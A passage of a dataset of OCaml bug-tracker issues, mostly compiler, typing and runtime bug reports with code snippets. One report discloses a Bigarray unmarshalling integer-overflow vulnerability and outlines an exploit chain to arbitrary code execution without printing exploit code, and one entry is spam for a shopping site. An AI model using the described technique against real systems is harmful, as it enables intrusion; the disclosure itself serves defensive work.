distinction. The manual does not make it particularly clear. That is why I am filing this bug report. A discussion on the discord chat channel seemed to reveal that _many_ beginners were confused about this.)\r\n\r\nIt would be good to make this _very_ explicit in the manual.\n\n## Steps to reproduce\n\n1. Try learning OCaml\r\n2. Become confused about multi-argument constructors vs. tuple constructors in sum types.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7782\n**Reporter:** sagotch\n**Assigned to:** @Octachron\n**Status:** resolved (set by @Octachron on 2018-04-20T08:51:32Z)\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Platform:** Mac\n**OS:** Mac OS\n**OS Version:** 10.13.4\n**Version:** 4.06.1\n**Category:** typing\n\n## Bug description\n\nlet for_all =\r\n    let module IntSet =\r\n      Set.Make (struct type t = int let compare = Pervasives.compare end)\r\n    in\r\n    fun fn data ->\r\n    let maybe_update acc i v = if fn v then acc else IntSet.add i acc in\r\n    let init =\r\n      let rec fold i acc = function\r\n        | v :: tl -> fold (i + 1) (maybe_update acc i v) tl\r\n        | [] -> acc\r\n      in\r\n      fold 0 IntSet.empty\r\n    in\r\n    let update_idx_after i f acc =\r\n      IntSet.map (fun i' -> if i' >= i then f i' 1 else i') acc\r\n    in\r\n    let f = fun acc -> function\r\n      | Set x -> init x\r\n      | Patch updates ->\r\n        List.fold_left\r\n          (fun acc -> function\r\n             | X (i, i') ->\r\n               if IntSet.mem i acc = IntSet.mem i' acc\r\n               then acc\r\n               else if IntSet.mem i acc\r\n               then IntSet.add i' (IntSet.remove i acc)\r\n               else IntSet.add i (IntSet.remove i' acc)\r\n             | R i ->\r\n               let acc = update_idx_after i (-) acc in\r\n               IntSet.remove i acc\r\n             | I (i, v) ->\r\n               let acc = update_idx_after i (+) acc in\r\n               maybe_update acc i v\r\n             | U (i, v) ->\r\n               maybe_update (IntSet.remove i acc) i v)\r\n          acc\r\n          updates\r\n    in\r\n    React.S.fold f (init (value data)) (event data)\r\n    |> React.S.map IntSet.is_empty\r\n\r\nError: The implementation src/reactiveData.ml\r\n       does not match the interface src/reactiveData.cmi:\r\n       ...\r\n       In module RList:\r\n       Values do not match:\r\n         val for_all : ('_weak1 -> bool) -> '_weak1 t -> bool React.signal\r\n       is not included in\r\n         val for_all : ('a -> bool) -> 'a t -> bool React.signal\r\n       File \"src/reactiveData.mli\", line 194, characters 2-54:\r\n         Expected declaration\r\n       File \"src/reactiveData.ml\", line 476, characters 6-13:\r\n         Actual declaration\n\n## Steps to reproduce\n\nTry to compile https://github.com/ocsigen/reactiveData/pull/23 but with \r\n\r\nlet for_all =\r\n    let module IntSet =\r\n      Set.Make (struct type t = int let compare = Pervasives.compare end)\r\n    in\r\n    fun fn data ->\r\n\r\ninstead of \r\n\r\n  let for_all fn data =\n\n## Additional information\n\nDelaring the IntSet module at toplevel solved the issue.\r\n\r\nDeclaring it inside the function works as well.\r\n\r\ni.e.:\r\n  let for_all fn data =\r\n    let module IntSet =\r\n      Set.Make (struct type t = int let compare = Pervasives.compare end)\r\n    in\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7781\n**Reporter:** @lpw25\n**Assigned to:** @garrigue\n**Status:** confirmed (set by @garrigue on 2018-04-18T14:44:25Z)\n**Resolution:** open\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.06.1\n**Target version:** later\n**Category:** typing\n**Monitored by:** @nojb @gasche\n\n## Bug description\n\nThe following code does not type check:\r\n\r\n    type 'a t = [< `A of int & string ] as 'a\r\n\r\n    let f (x : _ t) =\r\n      match x with\r\n      | `A _ -> ()\r\n\r\n    Characters 84-88:\r\n      | `A _ -> ()\r\n        ^^^^\r\n    Error: This pattern matches values of type [? `A of int ]\r\n           but a pattern was expected which matches values of type\r\n             [< `A of int & string ] t\r\n           Types for tag `A are incompatible\r\n\r\nHowever, adding what should be a spurious type annotation makes it work:\r\n\r\n    let f (x : _ t) =\r\n      match (x : [< `A of int & string]) with\r\n      | `A _ -> ()\r\n\r\n    val f : [< `A of int & string & 'a ] t -> unit = <fun>\r\n\r\nThe issue here is that partial copies, as used when typing pattern matching, remove the details of polymorphic variants but do not expand aliases. So in the second case we have the expected type:\r\n\r\n    [> ]\r\n\r\nwhen type checking the pattern, whilst in the original case we have:\r\n\r\n    [> ] t\r\n\r\nwhich unfortunately still expands out to:\r\n\r\n    [< `A of int & string ]\r\n\r\n\r\nOf course conjunctive polymorphic variants don't matter much, so this is hardly urgent, but it is disappointing when the syntax used to express a type affects the outcome of type-checking.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7777\n**Reporter:** @ygrek\n**Assigned to:** @nojb\n**Status:** resolved (set by @nojb on 2018-04-15T18:58:13Z)\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** major\n**Category:** compiler driver\n\n## Bug description\n\n$ cat q.ml \r\n# 10\r\n$ opam sw 4.06.0\r\n$ ocamlc -c q.ml\r\n$ opam sw 4.07.0+beta2\r\n$ ocamlc -c q.ml\r\nFile \"q.ml\", line 1, characters 0-1:\r\nError: Syntax error\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7776\n**Reporter:** rescueme\n**Status:** closed (set by @xavierleroy on 2018-05-21T16:41:36Z)\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** documentation\n\n## Bug description\n\nDiscover cool things to buy online, ranging from innovative gadgets, to outrageously expensive luxuries, to utterly useless items.\r\n\r\nhttps://awesomeshityoucanbuy.com/category/gear-and-gadgets-gifts\n"},{"labels":["bug"],"text":"**Original bug ID:** 1454\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Pierre\nVersion: 3.06\nOS: GNU/Linux\nSubmission from: vpn.epinetworx.com (213.41.61.154)\n\n\nHi,\n\nI try to compile ocaml-3.06 on my GNU/Linux system with gcc-3.2\nI did a configure and a \"make world\" and I got this :\n\n[...]\nmake[1]: Entering directory `/tmp/ocaml-3.06/otherlibs/labltk'\ncd support; make\nmake[2]: Entering directory `/tmp/ocaml-3.06/otherlibs/labltk/support'\ngcc -fno-defer-pop -Wall -Wno-unused -D_FILE_OFFSET_BITS=64 -D_REENTRANT\n-I../../../byterun -I/usr/X11R6/include -fPIC -c cltkImg.c\ncltkImg.c: In function `camltk_setimgdata_native':\ncltkImg.c:102: too few arguments to function `Tk_PhotoPutBlock'\nmake[2]: *** [cltkImg.o] Error 1\nmake[2]: Leaving directory `/tmp/ocaml-3.06/otherlibs/labltk/support'\nmake[1]: *** [all] Error 2\nmake[1]: Leaving directory `/tmp/ocaml-3.06/otherlibs/labltk'\nmake: *** [otherlibraries] Error 2\n\n\n\n\nIt would be great if you could help me with this !\n\nBest regards,\n\nPierre.\n"},{"labels":["bug",null,null],"text":"**Original bug ID:** 7774\n**Reporter:** @rlepigre\n**Assigned to:** @gasche\n**Status:** resolved (set by @gasche on 2018-04-14T21:14:09Z)\n**Resolution:** duplicate\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.05.0\n**Category:** typing\n**Duplicate of:** #7364\n\n## Bug description\n\nThe following mutual type definition is rejected.\r\n\r\n##########\r\ntype 'a t = {name : string; data : 'a}\r\nand any = Any : 'a t -> any [@@ocaml.unboxed]\r\n##########\r\n\r\nAccording to the manual, it should be accepted, and there does not seem to be any good reason to reject it. (Hopefully, an element of ['a t] can never be a [float].)\n\n## Steps to reproduce\n\nJust run OCaml on a file containing the two lines.\n\n## Additional information\n\nThe problem is the same with the 4.07.0+trunk version.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7773\n**Reporter:** @johnwhitington\n**Assigned to:** @nojb\n**Status:** resolved (set by @nojb on 2018-04-16T10:31:23Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** major\n**Platform:** Mac\n**OS:** OS X\n**OS Version:** 10.13.4\n**Version:** 4.07.0+dev/beta2/rc1/rc2\n**Category:** configure and build/install\n**Monitored by:** @nojb\n\n## Bug description\n\nAfter\r\n\r\n./configure\r\nmake world.opt\r\nsudo make install\r\n\r\nwe get:\r\n\r\ngorge:repos john$ ocaml -init /dev/null\r\n        OCaml version 4.07.0+dev6-2018-04-10\r\n\r\n# Sys.argv\r\n  ;;\r\nError: /usr/local/lib/ocaml/sys.cmi\r\nis not a compiled interface for this version of OCaml.\r\nIt seems to be for an older version of OCaml.\r\n#\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7769\n**Reporter:** Michael_Perin\n**Assigned to:** @nojb\n**Status:** resolved (set by @nojb on 2018-04-11T12:27:13Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Platform:** Intel Core i7\n**OS:** Mac OS\n**OS Version:** 10.13.3\n**Version:** 4.02.3\n**Category:** standard library\n**Monitored by:** @nojb\n\n## Bug description\n\nOn a stream made from a file, using Stream.of_channel, the function Stream.junk : 'a Stream.t -> unit\r\nwhich should \"Remove the first element of the stream, possibly unfreezing it before.\"\r\nhas no effect until we use Stream.next.\r\n\r\nIt behaves normally on a stream made from a string.\r\n\r\nHere is a piece of code that demonstrates this strange behaviour.\n\n## Steps to reproduce\n\n#create a file\r\necho \"abcdefghijklmnopqrstuvwxyz\" > alphabet.txt\r\n\r\n# execute the uploaded file\r\nocaml demo.ml\n\n## File attachments\n\n- [demo.ml](https://gist.githubusercontent.com/vicuna/0250bcfae432ca1845a371cffd2edc2f/raw/4951e6569170a06f2b73ba193c9e098d128932ac/demo.ml)\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7768\r\n**Reporter:** @gasche\r\n**Assigned to:** @lpw25\r\n**Status:** assigned (set by @gasche on 2018-04-10T10:18:10Z)\r\n**Resolution:** open\r\n**Priority:** normal\r\n**Severity:** minor\r\n**Version:** 4.07.0+dev/beta2/rc1/rc2\r\n**Target version:** 4.07.0+dev/beta2/rc1/rc2\r\n**Category:** language features\r\n**Related to:** #7706\r\n**Monitored by:** @stedolan @yallop @hcarty\r\n\r\n## Bug description\r\n\r\nLeo has an example in\r\n\r\n  https://github.com/ocaml/ocaml/pull/1565\r\n\r\nwhich is\r\n\r\n```ocaml\r\nlet r = ref None\r\nlet rec x =\r\n  let s = { contents = 5 } in\r\n  r.contents <- Some s;\r\n  let _ = x in\r\n  s\r\nlet () = match !r with\r\n  | None -> assert false\r\n  | Some s -> assert (s != x)\r\n```\r\n\r\nIt is a bug that `(s != x)` holds on this code: one would expect from the definition of x that s and x be equal, but the current compilation scheme pre-allocates `x`, then computes its values (`x`) and copies it back into the pre-allocated space, so we get an implicit shallow copy of `s`.\r\n\r\nLeo proposes to fix this issue by marking locally-bound values containing mutable data (whose shallow copy would be observable) as \"Dynamic\"-sized in the recursive-value analysis, the intuition being (I guess?) that Static means \"can be preallocated\" and thus implicitly \"can be shallow-copied in non-observable ways\".\r\n\r\nOn the other hand, mutable values that are bound to recursive identifiers but not locally-bound in the recursive definitions should remain Static because (1) otherwise reasonable code that is currently accepted would be rejected and (2) Leo claims that those mutable values are used linearily at value-construction time (no other initialization-time computation of the recursive declaration nest uses them), so they are undistinguishable from their shallow copies.\r\n\r\n(This does not look obvious to me, and I am frustrated by the constant overloading of what those \"Static\" and \"Dynamic\" markers mean. It's past time for some proper design work.)\r\n\r\n## Additional information\r\n\r\nI set the target 4.07+dev based on Leo's claim that this is easy to fix. I think the issue is non-critical (at worst, unexpected shallow copies happen; in particular, I don't think we can break type-soundness from this source of issues), so delaying to 4.08 would be fine.\r\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7767\n**Reporter:** @ivg\n**Assigned to:** @yallop\n**Status:** resolved (set by @yallop on 2018-04-11T07:50:00Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.06.0\n**Fixed in version:** 4.07.0+dev/beta2/rc1/rc2\n**Category:** typing\n\n## Bug description\n\nI have an example of a definition that was accepted by previous versions of OCaml and is rejected after #556 [1]. A read carefully through all comments in that GPR and I didn't find anything that will mention that such definitions are no longer accepted. So this is why I'm marking this as \"not expected\". And I let you judge whether it is a regression or not and issuing this report to show an example of a real-world program, that is no longer accepted. \r\n\r\nHere is an example (I'm sorry I don't like to reduces examples, so I minimized it while still keeping some amount of sense in it, the example is taken from the [real code][2]).\r\n\r\nThe minimized example:\r\n```\r\ntype prog = Seq of prog list | Exp of string;;\r\nlet concat_map xs ~f = List.map f xs |> List.concat;;\r\nlet rec concat_prog = concat_map ~f:(function Seq xs -> concat_prog xs | x -> [x]);;\r\nError: This kind of expression is not allowed as right-hand side of `let rec'\r\n```\r\n\r\n[1]: https://github.com/ocaml/ocaml/pull/556 \r\n[2]: https://github.com/BinaryAnalysisPlatform/bap/blob/master/lib/bap_primus/bap_primus_lisp_program.ml#L153\n"},{"labels":["bug",null,null],"text":"**Original bug ID:** 7766\n**Reporter:** Vincent L\n**Assigned to:** @Octachron\n**Status:** resolved (set by @Octachron on 2018-04-09T15:10:29Z)\n**Resolution:** duplicate\n**Priority:** normal\n**Severity:** crash\n**OS:** OS X\n**OS Version:** 10.11.6 15G2001\n**Version:** 4.06.1\n**Fixed in version:** 4.07.0+dev/beta2/rc1/rc2\n**Category:** middle end (typedtree to clambda)\n**Duplicate of:** #7695\n**Monitored by:** @nojb @gasche\n\n## Bug description\n\nWhen the attached file is compiled via `ocamlc` or `ocamlopt`, the compiler crashes with: âFatal error: exception Ctype.Unify(_)â (Raised at file \"typing/ctype.ml\", line 2797, characters 6-45â¦).\r\n\r\nOCaml 4.06.1 and 4.05.0 behave like this.\r\n\r\nEarlier versions produce a sensible error message:\r\n\r\nFile \"subst.ml\", line 25, characters 4-6:\r\nError: This expression has type unit P.gty P.gfunc\r\n       but an expression was expected of type int P.gty P.gfunc\r\n       Type unit is not compatible with type int\n\n## Additional information\n\nWhen the commented line is uncommented, the program is well-typed and correctly compiled.\n\n## File attachments\n\n- [subst.ml](https://gist.githubusercontent.com/vicuna/e62eb956b8273d4bb30fc01fa0a1dc60/raw/20635828ed1262747f88b278b8d19a52642862a1/subst.ml)\n"},{"labels":["bug",null,null],"text":"**Original bug ID:** 7765\n**Reporter:** maxdos\n**Status:** resolved (set by @xavierleroy on 2018-04-12T07:37:40Z)\n**Resolution:** fixed\n**Priority:** urgent\n**Severity:** major\n**Version:** 4.06.0\n**Target version:** 4.07.0+dev/beta2/rc1/rc2\n**Fixed in version:** 4.07.0+dev/beta2/rc1/rc2\n**Category:** standard library\n**Monitored by:** @nojb \"Richard Jones\"\n\n## Bug description\n\nThe bigarray module in all recent ocaml versions is capable of reading in serialized (marshalled) objects from a external source which is often used for network operations and interprocess communication.\r\n\r\nhttps://github.com/ocaml/ocaml/blob/ea60609504cc53c06a2711bba51b9a37db557a28/byterun/bigarray.c#L458\r\nA integer overflow vulnerability allows under certain circumstances an remote attacker to input a corrupt object and edit arbitrary addresses in the processes memory which leads over common techniques (in this take libc one gadget but any rop gadget or got table vector would work) to arbitrary memory access (!) and in the course also arbitrary code execution\r\n\r\nPlease check the writeup.pdf for more details !!\r\n\r\nIn variations of this the exploit is usable in all ocaml versions we tested no matter if compiled to binary or intepreted (!)\n\n## Steps to reproduce\n\nCheck out the attached archive and run the makefile (or use the precompile executable)\r\nthe exploit can be run by executing exploit.py (python2.7 and pwntools are required)\r\nThe last step of code execution is using a one-gadget attack technique and is specific to the glibc version in use (e.g. tested is debian glibc 2.24-11+deb9u1) but can with minimal amount of work be ported to any libc version on any patch level to our knowledge \r\n\r\nOf course you can also use the exploit.py to write your own version of exploit\n\n## Additional information\n\nThis Vulnerability in ocaml was discovered by me (maximilian.tschirschnitz@gmx.de) and the exploit collaboratly developed with (philipp.hagenlocher@tum.de)\r\nFor illustration purposes it was packaged as security challenge to demonstrate the impact of the issue (see writeup.pdf)\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7764\n**Reporter:** @damiendoligez\n**Assigned to:** @gasche\n**Status:** resolved (set by @gasche on 2018-04-05T20:18:00Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.07.0+dev/beta2/rc1/rc2\n**Fixed in version:** 4.07.0+dev/beta2/rc1/rc2\n**Category:** standard library\n**Monitored by:** @nojb @hhugo\n\n## Bug description\n\nThe threshold used by `List.init` to switch between recursive to tail-rec implementations will cause problems on js_of_ocaml. See https://github.com/ocaml/ocaml/pull/1034#pullrequestreview-88899868 for the original report.\n"},{"labels":["bug"],"text":"**Original bug ID:** 1453\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Sven Luther\nVersion: 3.06\nOS: Debian GNU/Linux\nSubmission from: astrasbourg-206-1-18-22.abo.wanadoo.fr (81.49.129.22)\n\n\nHello,\n\nla@iki.fi submitted me this bug report :\n\n===============BEGIN===============\nProblem: take any program, such as:\n\n(* t.ml *)\n\nlet rec thr str =\n  print_string str;\n  print_newline ();\n  Thread.delay 1.0;\n  thr str\n    \nlet _ = \n  ignore (Thread.create thr \"foo\");\n  ignore (Thread.create thr \"bar\");\n  read_line ()\n\n...and native-compile it with thread support:\n\n$ ocamlopt -o t -thread unix.cmxa threads.cmxa t.ml\n\nIt works, all right:\n\n$ ./t\nfoo\nbar\nfoo\nbar\nfoo\nbar\n\n...and creates two extra threads, one is ocaml's tick thread, the other,\ndunno, something used internally by linuxthreads?\n\n$ ps -C t\n  PID TTY          TIME CMD\n12240 pts/5    00:00:00 t\n12241 pts/5    00:00:00 t\n12242 pts/5    00:00:00 t\n12243 pts/5    00:00:00 t\n12244 pts/5    00:00:00 t\n\nNow control-C the program, and it stops. But:\n\n$ ps -C t\n  PID TTY          TIME CMD\n12242 pts/5    00:00:00 t\n\nAnd this is apparently the \"tick\" thread:\n\n$ strace -p 12242\nselect(0, NULL, NULL, NULL, {0, 10000}) = 0 (Timeout)\nselect(0, NULL, NULL, NULL, {0, 50000}) = 0 (Timeout)\nselect(0, NULL, NULL, NULL, {0, 50000}) = 0 (Timeout)\nselect(0, NULL, NULL, NULL, {0, 50000}) = 0 (Timeout)\n\nIt has to be killed with kill -9. Not fun.\n===============END=======================\n\nI confirmed this, but it doesn't happen all the time, maybe 1/2 or 1/3 of the\ntime.\n\nMaybe it is related to the moment the threaded program is interrupted.\n\nFriendly,\n\nSven Luther\n"},{"labels":["bug"],"text":"**Original bug ID:** 1450\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nHello, ...\n\nThis is a strange problem i got with the debian package.\n\n==============================\naurora:~$ ocamlopt str.cmxa stuff.ml\n/usr/lib/ocaml/libasmrun.a(str.o)(.text+0x1de): In function `is_printable':\n: undefined reference to `__ctype_b'\ncollect2: ld returned 1 exit status\nError during linking\n\n\nstuff.ml is an empty file.\n\n\nThis does not occur when I build the distribution from source by hand,\nDebian or upstream. I can actually copy the libasmrun.a file from the\ncompiled source tree into /usr/lib/ocaml and the build will succeed:\n\n\naurora:/usr/src/ocaml/ocaml-3.06/asmrun# cp libasmrun* /usr/lib/ocaml\naurora:~$ ocamlopt str.cmxa stuff.ml\naurora:~$\n\n\nThis is, in addition to the first time I've seen the error, the first\ntime I've used Str. Learning the language :)\n=============================\n\n\nWell, it is solved by just rebuilding the package, so that is what i\nwill do. I guess it may be linked with the fact that we changed libc or\nsomething like that between the time the ocaml package was built and the\ntime it was used.\n\nStill it seems strange to me, and so i think it may be interresting for\nyou to know. Also if you have any hint as to the reason of this problem,\ni am interrested.\n\nFriendly,\n\nSvne Luther\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7760\n**Reporter:** @stedolan\n**Assigned to:** @maranget\n**Status:** resolved (set by @maranget on 2018-04-10T09:05:11Z)\n**Resolution:** open\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.06.0\n**Fixed in version:** 4.07.0+dev/beta2/rc1/rc2\n**Category:** tools (ocaml{lex,yacc,dep,debug,...})\n**Monitored by:** @nojb @gasche @maranget\n\n## Bug description\n\nOn my machine (amd64 Debian), the following program usually segfaults:\r\n\r\n    rule read = shortest\r\n      | (\"aa\" | \"bbb\") (_ as x) _?   { x }\r\n      | _ as y                       { y }\r\n\r\n    { let _ = read (Lexing.from_string \"asdf\") }\r\n\r\nwhen compiled and run as:\r\n\r\n    ocamllex -q -o lexer.ml lexer.mll && ocamlopt -o lexer lexer.ml && ./lexer\r\n\r\nThis example is reduced from a larger lexer. The segfault only seems to occur when using 'shortest' instead of 'parse', but I'm not sure exactly which combination of features triggers the bug. The problem is reproducible using OCaml versions back to at least 3.11.2.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7755\n**Reporter:** kosik\n**Status:** acknowledged (set by @xavierleroy on 2018-05-21T17:00:20Z)\n**Resolution:** open\n**Priority:** low\n**Severity:** minor\n**Version:** 4.06.1\n**Category:** lexing and parsing\n**Monitored by:** @nojb @gasche\n\n## Bug description\n\nSee \"Steps To Reproduce\".\n\n## Steps to reproduce\n\nAfter executing the following comments:\r\n\r\n  ocamlc -g -o main main.ml\r\n  OCAMLRUNPARAM=b ./main\r\n\r\nI see:\r\n\r\n  Fatal error: exception Main.E\r\n  Raised at file \"generated.ml\", line 4002, characters 4-47\r\n  Called from file \"generated.ml\", line 13002, characters 0-6\r\n\r\nI was expecting to see:\r\n\r\n  Raised at file \"original.mly\", line 8, characters 13-14\n\n## Additional information\n\nWhen I delete the following line from the attached \"mail.ml\" file:\r\n\r\n  let _1 = () in\r\n\r\nthen \"ocamlc\" behaves in the expected way. I.e. I see:\r\n\r\n  Fatal error: exception Main.E\r\n  Raised at file \"original.mly\", line 8, characters 13-14\r\n  Called from file \"generated.ml\", line 13002, characters 0-6\n\n## File attachments\n\n- [main.ml](https://gist.githubusercontent.com/vicuna/e15a2b73682efd730cef81735cec53b7/raw/e8cf910867665ea8a276d936480812efb7f72508/main.ml)\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7754\n**Reporter:** cyocum\n**Status:** acknowledged (set by @xavierleroy on 2018-04-06T18:06:09Z)\n**Resolution:** open\n**Priority:** normal\n**Severity:** minor\n**OS:** Fedora Linux\n**OS Version:** 27\n**Version:** 4.06.0\n**Category:** dynlink and natdynlink\n**Monitored by:** @nojb @dbuenzli\n\n## Bug description\n\nI have a system which uses Dynlink to dynamically load some code (.cmxs). The problem that I am having is that you cannot use the Object system in OCaml with Dynlink when naively compiling.  This is because the camlCamlinternalOO is not linked. The error is below:\r\n\r\nundefined symbol: camlCamlinternalOO__create_object_opt_1533\n\n## Steps to reproduce\n\nTo reproduce you need to files.\r\n\r\nobj_test.ml\r\n\r\nclass istack = object\r\n    val mutable v = [0; 2]\r\n\r\n    method pop =\r\n      match v with\r\n      | hd :: tl ->\r\n          v <- tl;\r\n          Some hd\r\n      | [] -> None\r\n\r\n    method push hd =\r\n      v <- hd :: v\r\n  end\r\n\r\nwhich is complied thus: ocamlfind opt -shared -o obj_test.cmxs obj_test.ml\r\n\r\nmain.ml\r\n\r\nlet load_test_plugin fname =\r\n  let fname =  Dynlink.adapt_filename fname in\r\n  try\r\n    Dynlink.loadfile fname\r\n  with\r\n  | (Dynlink.Error err) as e ->\r\n     print_endline (\"ERROR loading plugin: \" ^ (Dynlink.error_message err));\r\n     raise e\r\n\r\nlet _ =\r\n  load_test_plugin Sys.argv.(1)\r\n\r\nwhich is compiled thus: ocamlfind opt -package dynlink -linkpkg main.ml\r\n\r\nWhen you try to run the code: ./a.out obj_test.cmxs, you will get the error indicated above.\n\n## Additional information\n\nSee Also https://discuss.ocaml.org/t/objects-and-dynlink/1720\r\n\r\nThere is a workaround by adding this to main.ml:\r\n\r\nlet _obj = object end in\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7751\r\n**Reporter:** kosik\r\n**Assigned to:** @garrigue\r\n**Status:** confirmed (set by @garrigue on 2018-03-13T02:37:04Z)\r\n**Resolution:** open\r\n**Priority:** normal\r\n**Severity:** minor\r\n**Version:** 4.06.1\r\n**Category:** toplevel\r\n**Related to:** #7134\r\n**Monitored by:** @nojb\r\n\r\n## Bug description\r\n\r\nIf I do this on the Ocaml toplevel:\r\n\r\n```\r\n  #use \"topfind\";;\r\n  #require \"compiler-libs.common\";;\r\n  Parse.implementation (Lexing.from_string \"foo\");;\r\n```\r\n\r\nwhat I see is this:\r\n\r\n```\r\n  - : Parsetree.structure =\r\n  [{Parsetree.pstr_desc =\r\n     Parsetree.Pstr_eval\r\n      ({Parsetree.pexp_desc = Parsetree.Pexp_ident <abstr>; pexp_loc = <abstr>;\r\n        pexp_attributes = []},\r\n      []);\r\n    pstr_loc = <abstr>}]\r\n```\r\n\r\nThe problem (in my opinion) is that some of the values are printed as\r\n\r\n```\r\n  <abstr>\r\n```\r\n\r\neven if they are not abstract and the corresponding *.cmi files (which describes their structure) is available. For some reason, Ocaml toplevel chooses not to process them.\r\n\r\nI find this behavior surprising (at least).\r\nIt certainly also is an undocumented behavior.\r\n\r\nRelated surprising behavior is that when I install printers for those values that are printed as `<abstr>`, those printers will not be used\r\n(just because that Ocaml toplevel chooses (for an unknown reason) not to process relevant *.cmi files.\r\n\r\nInterestingly, if I make some dummy calls of functions in some of the modules that Ocaml toplevel (temporarily) avoided to process, it processes them lazily and then the printing procedures behave in an expected manner.\r\n\r\n## Steps to reproduce\r\n\r\nIn Ocaml toplevel:\r\n\r\n```\r\n  #use \"topfind\";;\r\n  #require \"compiler-libs.common\";;\r\n  Parse.implementation (Lexing.from_string \"foo\");;\r\n```\r\n\r\n## Additional information\r\n\r\nhttps://sympa.inria.fr/sympa/arc/caml-list/2018-03/msg00033.html\r\n"},{"labels":["bug",null,null],"text":"**Original bug ID:** 7750\n**Reporter:** @stijn-devriendt\n**Assigned to:** @damiendoligez\n**Status:** resolved (set by @alainfrisch on 2018-11-09T13:27:26Z)\n**Resolution:** fixed\n**Priority:** high\n**Severity:** major\n**Platform:** Linux\n**OS:** Ubuntu\n**OS Version:** 14.04\n**Version:** 4.05.0\n**Target version:** 4.08.0+dev/beta1/beta2\n**Category:** runtime system and C interface\n**Related to:** #7158\n**Parent of:** #7180\n**Monitored by:** @nojb @gasche @hcarty @dbuenzli @alainfrisch\n\n## Bug description\n\nIn a long-running application we make heavy use of Bigarrays (easily pushing 250MiB/s per application). With 4 of these applications running on a server with 128GiB of RAM, the application stalled with Out_of_memory exceptions. Apparently each of them was eating 30GiB of memory with mostly stale Bigarrays.\r\n\r\nAfter triggering compaction on one of the applications through RPC, memory use dropped to multiple MiBs (see additional info). Memory use as observed by the OS also fell steeply as all the stale bigarrays were disposed off. (This also proved that it wasn't a memory leak in other parts of our code).\r\n\r\nIn the output one can see that the ratio of minor/major collections is heavily skewed in favor of minor collections (36000/137). If many bigarrays live on the major heap, this means they will linger for a long time before getting cleaned up. Also, because the (default) space_overhead of 80% wasn't hit (1,3GiB/1,8GiB) major collection also wasn't sped up.\r\n\r\nI created a small test-case that I believe sufficiently represents the issue at hand. The provided test-application easily takes 11GiB of memory, where only about 4-6 (?) would be expected. Settings GC parameters space_overhead or max_overhead does not help. I believe that it might help our normal application a bit since a more normal memory allocation pattern is expected there, but that remains to be tested.\r\n\r\nThe test application essentially does the following:\r\n- create a very large major heap (about 2GiB), causing the major slice to do less work\r\n- repeatedly create 800MiB of bigarrays, then flush the minor heap so they get promoted to the major heap\r\n- it also keeps track of the bigarrays for 3 iterations, so one would in the order of magnitude of 2GiB + (3*800MiB) = 4.4GiB of memory.\r\n\r\nAs for the trigger of the bad behavior, I believe the fixing of ocaml/ocaml#7158 caused many fewer major garbage collections in our case (we also make use of Lwt_preemptive) - this issue started occuring after we upgraded the compiler from 4.03.0 to 4.05.0.\r\n\r\nSecondly, I believe that the last question posed in ocaml/ocaml#7180 may be related here:\r\n> if p is capped at 0.3, why do we reset caml_extra_heap_resources to 0.0?\r\n> Shouldn't it be decreased by the actual amount of work that was done to copy\r\n> with the steady state assumption?\r\n\r\nIn the test case, one can see that immediately after creating the bigarrays 'p' is capped to 0.3 and the remaining slices are rather small. In essence, it means that the garbage collector forgets about the excess and slows down significantly.\r\n\r\nOne potential fix would be to leave that excess in extra_heap_resources for the next iteration. Another improvement is probably to not only look at the ratio of free/total, but also have either a time-based or absolute-value based trigger (e.g. whenever promoted_words crosses a configurable boundary)\n\n## Steps to reproduce\n\n## ocamlbuild -lbigarray test.native && ./test.native\r\n## BEWARE: easily eats around 11-12GiB of memory\r\nopen Bigarray\r\n\r\nlet minor_heap_size = Gc.((get ()).minor_heap_size)\r\n\r\nlet () = Printf.printf \"Minor heap size = %dB\\n%!\" (minor_heap_size*8)\r\n\r\nlet display_stat state =\r\n  let open Gc in\r\n  let s = stat () in\r\n  Printf.printf\r\n    \"%s: minor_collections(%d), major_collections(%d), compactions(%d), heap_words(%d), live_words(%d), free_words(%d)\\n%!\"\r\n    state\r\n    s.minor_collections\r\n    s.major_collections\r\n    s.compactions\r\n    s.heap_words\r\n    s.live_words\r\n    s.free_words\r\n\r\n(* Create a bigarray and fill it to ensure memory is actually faulted in *)\r\nlet loop_inner count =\r\n  let rec aux count acc =\r\n    if count > 0\r\n    then\r\n      let a = Array1.create Char c_layout (8*1024*1024) in\r\n      let () = Array1.fill a '0' in\r\n      aux (count - 1) (a :: acc)\r\n    else\r\n      acc\r\n  in\r\n  aux count []\r\n\r\n(* Flush the minor heap 'count' times\r\n   returns the newly created data\r\n *)\r\nlet flush_minor count =\r\n  let rec flush_once remaining acc =\r\n    if remaining < 0\r\n    then\r\n      acc\r\n    else\r\n      flush_once (remaining-1) (remaining :: acc)\r\n  in\r\n  let rec flush remaining acc =\r\n    if remaining = 0\r\n    then\r\n      